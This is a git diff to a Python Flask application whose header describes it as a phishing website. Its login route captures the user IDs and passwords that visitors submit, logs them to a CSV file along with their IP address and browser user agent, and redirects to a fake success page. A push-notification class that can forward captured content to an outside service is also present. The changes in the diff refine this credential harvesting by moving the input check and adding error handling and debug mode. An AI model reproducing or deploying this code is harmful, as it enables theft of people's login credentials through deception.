@@ -1,7 +1,7 @@
 '''
 Author: whalefall
 Date: 2021-04-04 01:56:10
-LastEditTime: 2021-04-04 15:37:17
+LastEditTime: 2021-04-04 17:03:54
 Description: Flask框架钓鱼网站
 '''
 from flask import *
@@ -45,7 +45,7 @@ class Logging(object):
 class CoolPush():
 
     def __init__(self, token):
-
+        log = Logging()
         self.token = token
 
         self.headers = {
@@ -53,6 +53,7 @@ class CoolPush():
         }
 
     def pushSend(self, content):
+        log = Logging()
         url = "https://push.xuthus.cc/send/%s" % (self.token)
         data = {
             "c": content,
@@ -68,6 +69,7 @@ class CoolPush():
             log.error("[CoolPush]推送失败!")
 
     def pushGoup(self, content):
+        log = Logging()
         url = "https://push.xuthus.cc/group/%s" % (self.token)
         data = {
             "c": content,
@@ -107,7 +109,6 @@ def writeCSV(**keyword):
     }
     try:
         with codecs.open(path, "a", encoding="utf_8_sig") as cvs_file:
-
             headers = ["time", "userid", "pwd", "ua", "ip"]  # 表头
             writer = csv.DictWriter(cvs_file, headers)
             # writer.writeheader()  # 写表头
@@ -121,8 +122,8 @@ def writeCSV(**keyword):
                      (_time, userid, pwd, ua, ip))
 
         return True
-    except:
-        return False
+    except Exception as e:
+        raise(e)
 
 
 
@@ -156,16 +157,20 @@ def loginAPI():
     ua = request.headers.get('User-Agent')
     ip = request.remote_addr
 
-    if writeCSV(userid=userid, pwd=pwd, ua=ua, ip=ip):
-        pass
-    else:
-        render_template("error.html", title="未知错误", c="未知错误请联系管理员")
-
+    # 要先判断才保存!
     if userid == "" or userid == None or pwd == "" or pwd == None:
         return render_template("KsLoginAction.html", status="empty")
 
-    # return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)
+    try:
+        writeCSV(userid=userid, pwd=pwd, ua=ua, ip=ip)
+
+    except Exception as e:
+
+        return render_template("error.html", title="未知错误", c="%s"%(e))
+
     return redirect("/LoginSuccessAction/%s/%s/%s" % (userid, ip, ua.replace("/","-")))
+    # return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)
+    
 
 
 @app.route('/LoginSuccessAction/<userid>/<ip>/<ua>', methods=["GET", "POST"])
@@ -180,4 +185,4 @@ def page_not_found(e):
 if __name__ == "__main__":
     # bot = CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
     # log = Logging()
-    app.run(host="0.0.0.0", port=5000, threaded=True)
+    app.run(host="0.0.0.0", port=5000, threaded=True,debug=True)
